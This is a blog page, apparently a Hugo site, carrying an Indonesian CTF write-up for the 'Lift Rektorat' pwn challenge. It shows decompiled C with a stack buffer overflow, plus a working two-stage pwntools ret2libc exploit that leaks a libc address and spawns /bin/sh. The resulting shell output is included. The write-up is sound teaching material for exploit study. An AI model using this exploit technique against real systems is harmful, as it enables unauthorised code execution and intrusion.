@@ -1,0 +1,308 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Catousify</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
+  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/ctf/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="http://zeroload.github.io/ctf/">Catousify</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        
+          
+        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>No Clever Tagline Needed.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/about/">
+                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>AgriHack 0x2 - Lift Rektorat Writeup</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2017-11-24T00:38:01Z">Nov 24, 2017</time>
+        </li>
+        
+        <li>
+            Categories:
+            <em>
+                
+                    
+                    <a href="http://zeroload.github.io/ctf/categories/pwn">pwn</a>
+                
+                    , 
+                    <a href="http://zeroload.github.io/ctf/categories/writeup">writeup</a>
+                
+            </em>
+        </li>
+        
+
+        
+
+        <li>4 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    <blockquote>
+<p><em><strong>Lift Rektorat (300 pts)</strong></em> Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu tersadar, bahwa bahkan lift rektorat memiliki celah untuk dieksploitasi. Tunjukkan bagaimana kamu mengeksploitasi celah tersebut. &ndash; binary &ndash;</p>
+</blockquote>
+<p><em><strong>Solusi:</strong></em> Diberikan binary ELF 32-bit dengan NX bit enabled dan tanpa stack canary. Dapat di-_ramal-<em>kan sekiranya soal ini di_solve</em> dengan return to libc karena stack sendiri tidak dapat dieksekusi.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">danger</span>()
+{
+  <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [esp+Eh] [ebp-4Ah]
+</span><span style="color:#75715e"></span>
+  strcpy(aSelamatDatangD, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|            Peringatan Bahaya Lift Berhenti Berfungsi                |</span><span style="color:#e6db74">&#34;</span>);
+  strcpy(aSilahkanMasuka, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|              Silahkan Kirimkan Pesan Kepada Petugas                 |</span><span style="color:#e6db74">&#34;</span>);
+  cetak(<span style="color:#ae81ff">0</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|--------------------||-------------||------------||------------------|</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|____________________||-------------||------------||__________________|</span><span style="color:#e6db74">&#34;</span>);
+  printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Pesan : </span><span style="color:#e6db74">&#34;</span>);
+  fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">200</span>, stdin);
+  strcpy(aSelamatDatangD, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                        Pesan Terkirim                               |</span><span style="color:#e6db74">&#34;</span>);
+  strcpy(aSilahkanMasuka, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|            Silahkan Menunggu Sejenak dan Tetap Tenang               |</span><span style="color:#e6db74">&#34;</span>);
+  cetak(<span style="color:#ae81ff">0</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|--------------------||-------------||------------||------------------|</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|____________________||-------------||------------||__________________|</span><span style="color:#e6db74">&#34;</span>);
+  <span style="color:#66d9ef">return</span> sleep(<span style="color:#ae81ff">5u</span>);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">*</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">*</span>envp)
+{
+  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// ST08_4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// ST0C_4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [esp-4h] [ebp-28h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// [esp+0h] [ebp-24h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v8; <span style="color:#75715e">// [esp+7h] [ebp-1Dh]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [esp+8h] [ebp-1Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>v10; <span style="color:#75715e">// [esp+14h] [ebp-10h]
+</span><span style="color:#75715e"></span>
+  v10 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>argc;
+  setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+  cetak(<span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>__isoc99_scanf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>v7, v3, v4, v6, v7) <span style="color:#f92672">|</span><span style="color:#f92672">|</span> v7 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">12</span> )
+  {
+    strcpy(aSelamatDatangD, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                          Mohon Maaf                                 |</span><span style="color:#e6db74">&#34;</span>);
+    strcpy(aSilahkanMasuka, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                 Lantai yang Anda Masukan Salah                      |</span><span style="color:#e6db74">&#34;</span>);
+    cetak(<span style="color:#ae81ff">0</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|--------------------||-------------||------------||------------------|</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|____________________||-------------||------------||__________________|</span><span style="color:#e6db74">&#34;</span>);
+    exit(<span style="color:#ae81ff">0</span>);
+  }
+  <span style="color:#66d9ef">do</span>
+    v8 <span style="color:#f92672">=</span> getchar();
+  <span style="color:#66d9ef">while</span> ( v8 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> v8 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> );
+  strcpy(aSelamatDatangD, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                     Bogor Agricultural University                   |</span><span style="color:#e6db74">&#34;</span>);
+  strcpy(aSilahkanMasuka, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                     Searching and Serving The Best                  |</span><span style="color:#e6db74">&#34;</span>);
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> v7; <span style="color:#f92672">+</span><span style="color:#f92672">+</span>i )
+  {
+    sleep(<span style="color:#ae81ff">2u</span>);
+    byte_804B0C4[<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#39;</span>;
+    byte_804B0C4[<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#39;</span>;
+    byte_804B0C4[<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">|</span><span style="color:#e6db74">&#39;</span>;
+    byte_804B0C4[<span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">|</span><span style="color:#e6db74">&#39;</span>;
+    cetak(i);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|--------------------||-------------||------------||------------------|</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||             ||            ||                  |</span><span style="color:#e6db74">&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|____________________||-------------||------------||__________________|</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span> )
+    {
+      danger();
+      strcpy(aSelamatDatangD, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                     Bogor Agricultural University                   |</span><span style="color:#e6db74">&#34;</span>);
+      strcpy(aSilahkanMasuka, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                     Searching and Serving The Best                  |</span><span style="color:#e6db74">&#34;</span>);
+    }
+  }
+  cetak(i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|--------------------||                           ||------------------|</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||                           ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||                           ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||                           ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||                           ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||                           ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|                    ||                           ||                  |</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">|____________________||                           ||__________________|</span><span style="color:#e6db74">&#34;</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Terlihat kalau dalau dari source code, fungsi <code>danger</code> ada bug klasik stack buffer overflow pada fungsi fgets, yang me-overflow- <code>char s</code>. <code>danger</code> sendiri dipanggil saat iterasi i ke-7, user juga dapat mengontrol sampai berapa iterasi dilaksanakan. Lanjut ke permasalahan kedua, saved EIP bisa dikontrol dengan stack buffer overflow, tapi mau return kemana? return2libc perlu leaked libc address. Nah, teringat kalau binary ini adalah 32-bit jadi gaperlu repot-repot setup ROP yang terlihat magis, tinggal push GOT puts ke stack, trus print dengan menggunakan PLT puts <em>lagi</em>. Agar exploit berlanjut terus jangan lupa untuk return ke fungsi <code>danger</code> lagi untuk lanjut ke Stage ke-2 yakni return ke system dan exec /bin/sh. system address bisa dikalkulasi dengan bantuan libcdb. Dengan demikian strategi yang bisa ditulis pada code,</p>
+<ol>
+<li>Leak libc address, dengan push alamat suatu GOT lalu memanggil puts dan kembali ke danger</li>
+<li>Kalkulasi system dan /bin/sh dari libc address</li>
+<li>Input buffer == junk[78] + system + char junk[4] +  binsh</li>
+<li>profit</li>
+</ol>
+<p>Berikut codenya,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python2</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+r <span style="color:#f92672">=</span> process([<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./lift_rektorat</span><span style="color:#e6db74">&#39;</span>])
+lift <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./lift_rektorat</span><span style="color:#e6db74">&#39;</span>)
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">--------- STAGE 1 ---------</span><span style="color:#e6db74">&#39;</span>)
+
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">78</span> <span style="color:#75715e">#junk</span>
+buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(lift<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># call puts</span>
+buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(lift<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">danger</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># return back to danger</span>
+buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(lift<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># GOT</span>
+
+r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">7</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># control the iteration</span>
+r<span style="color:#f92672">.</span>sendline(buf)
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Pesan Terkirim</span><span style="color:#e6db74">&#39;</span>)
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">|____________________||-------------||------------||__________________|</span><span style="color:#e6db74">&#39;</span>)
+r<span style="color:#f92672">.</span>recvline()
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">--------- STAGE 2 ---------</span><span style="color:#e6db74">&#39;</span>)
+
+libc_puts <span style="color:#f92672">=</span> int(u32(r<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4</span>))) <span style="color:#75715e"># leaked libc address</span>
+<span style="color:#75715e"># local libc, saelo&#39;s vm ctfbox, Ubuntu 14.04.5 LTS, vagrant</span>
+puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00064da0</span>
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0003fe70</span>
+str_bin_sh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0015ff0c</span>
+
+libc_base <span style="color:#f92672">=</span> libc_puts <span style="color:#f92672">-</span> puts_offset
+libc_system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> system_offset
+libc_bin_sh <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> str_bin_sh_offset
+
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">78</span> <span style="color:#75715e"># junk</span>
+buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(libc_system)
+buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DEAD</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># junk</span>
+buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(libc_bin_sh)
+
+r<span style="color:#f92672">.</span>sendline(buf)
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><em><strong>$profit</strong></em></p>
+<pre><code>[+] Starting local process './lift_rektorat': pid 5802
+[*] '/home/vagrant/ctf/agrihack0x2/lift_rektorat'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] --------- STAGE 1 ---------
+[*] --------- STAGE 2 ---------
+[*] Switching to interactive mode
+\x86\x84\x0�    ]��a��`�
+[..redacted..]
+$ id
+uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
+$ whoami
+vagrant
+</code></pre><p><em><strong>Solved!</strong></em></p>
+<hr>
+<p>Sedikit cerita dibalik penemuan flag pada soal kali ini, sebelum saya mengerjakan soal ini sendiri, saya belum paham apa itu ROP dan berbagai macam permasalahan pada soal disini. <strong>Lesson learned:</strong> 32-bit calling convention, ret2libc, simple ROP.</p>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/bypassing-kakao-login-signature-check-for-tampered-android-application/"><i class="fa fa-chevron-circle-left"></i> Bypassing Kakao Login Signature Check for Tampered Android Application</a>
+        </li>
+        
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/tuctf-2017-reverse-engineering-writeup/">TUCTF 2017 - Reverse Engineering Writeup <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright © 2019 - kiror0 |
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://zeroload.github.io/ctf/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="http://zeroload.github.io/ctf/js/scripts.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+</body>
+
+</html>
